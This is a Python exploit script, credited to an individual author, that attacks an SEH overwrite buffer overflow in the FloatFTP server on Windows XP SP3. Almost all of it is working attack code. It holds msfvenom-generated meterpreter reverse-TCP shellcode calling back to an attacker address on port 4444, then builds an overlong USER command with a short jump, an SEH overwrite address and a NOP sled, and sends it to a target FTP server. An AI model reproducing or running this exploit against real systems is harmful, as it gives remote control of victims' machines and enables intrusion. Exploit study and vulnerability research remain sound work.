#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the SEH overwrite vulnerability in FloatFTP. Though it's an old vulnerability and many exploits exist for it. I created this from scratch.



#SEH=5f4580ca
#badchars=\x00\x0A\x0D
#payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00\x0A\x0D\x40' -f python
#Tested on Windows XP SP3

import sys
import socket

buf =  ""
buf += "\xdb\xc4\xba\xbc\x35\x0f\xa3\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x56\x31\x50\x18\x83\xe8\xfc\x03\x50\xa8\xd7"
buf += "\xfa\x5f\x38\x95\x05\xa0\xb8\xfa\x8c\x45\x89\x3a\xea"
buf += "\x0e\xb9\x8a\x78\x42\x35\x60\x2c\x77\xce\x04\xf9\x78"
buf += "\x67\xa2\xdf\xb7\x78\x9f\x1c\xd9\xfa\xe2\x70\x39\xc3"
buf += "\x2c\x85\x38\x04\x50\x64\x68\xdd\x1e\xdb\x9d\x6a\x6a"
buf += "\xe0\x16\x20\x7a\x60\xca\xf0\x7d\x41\x5d\x8b\x27\x41"
buf += "\x5f\x58\x5c\xc8\x47\xbd\x59\x82\xfc\x75\x15\x15\xd5"
buf += "\x44\xd6\xba\x18\x69\x25\xc2\x5d\x4d\xd6\xb1\x97\xae"
buf += "\x6b\xc2\x63\xcd\xb7\x47\x70\x75\x33\xff\x5c\x84\x90"
buf += "\x66\x16\x8a\x5d\xec\x70\x8e\x60\x21\x0b\xaa\xe9\xc4"
buf += "\xdc\x3b\xa9\xe2\xf8\x60\x69\x8a\x59\xcc\xdc\xb3\xba"
buf += "\xaf\x81\x11\xb0\x5d\xd5\x2b\x9b\x09\x1a\x06\x24\xc9"
buf += "\x34\x11\x57\xfb\x9b\x89\xff\xb7\x54\x14\x07\xce\x73"
buf += "\xa7\xd7\x68\x13\x59\xd8\x88\x3d\x9e\x8c\xd8\x55\x37"
buf += "\xad\xb3\xa5\xb8\x78\x29\xac\x2e\x43\x05\x9b\xb2\x2b"
buf += "\x57\xdc\xdb\xf7\xde\x3a\x8b\x57\xb0\x92\x6c\x08\x70"
buf += "\x43\x05\x42\x7f\xbc\x35\x6d\xaa\xd5\xdc\x82\x02\x8d"
buf += "\x48\x3a\x0f\x45\xe8\xc3\x9a\x23\x2a\x4f\x2e\xd3\xe5"
buf += "\xb8\x5b\xc7\x12\xdf\xa3\x17\xe3\x4a\xa3\x7d\xe7\xdc"
buf += "\xf4\xe9\xe5\x39\x32\xb6\x16\x6c\x41\xb1\xe9\xf1\x73"
buf += "\xc9\xdc\x67\x3b\xa5\x20\x68\xbb\x35\x77\xe2\xbb\x5d"
buf += "\x2f\x56\xe8\x78\x30\x43\x9d\xd0\xa5\x6c\xf7\x85\x6e"
buf += "\x05\xf5\xf0\x59\x8a\x06\xd7\xd9\xcd\xf8\xa5\xf5\x75"
buf += "\x90\x55\x46\x86\x60\x3c\x46\xd6\x08\xcb\x69\xd9\xf8"
buf += "\x34\xa0\xb2\x90\xbf\x25\x70\x01\xbf\x6f\xd4\x9f\xc0"
buf += "\x9c\xcd\x10\xba\xed\xf2\xd1\x3b\xe4\x96\xd2\x3b\x08"
buf += "\xa9\xef\xed\x31\xdf\x2e\x2e\x06\xd0\x05\x13\x2f\x7b"
buf += "\x65\x07\x2f\xae"


evil = "USER "+ "A"*569 + "\xEB\x06\x90\x90" + "\xCA\x80\x45\x5F" + buf + "\x90"*(5500-577-len(buf)) + '\r\n'

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.43.72',21))
s.recv(1024)
s.send(evil)
s.recv(1024)
s.close()
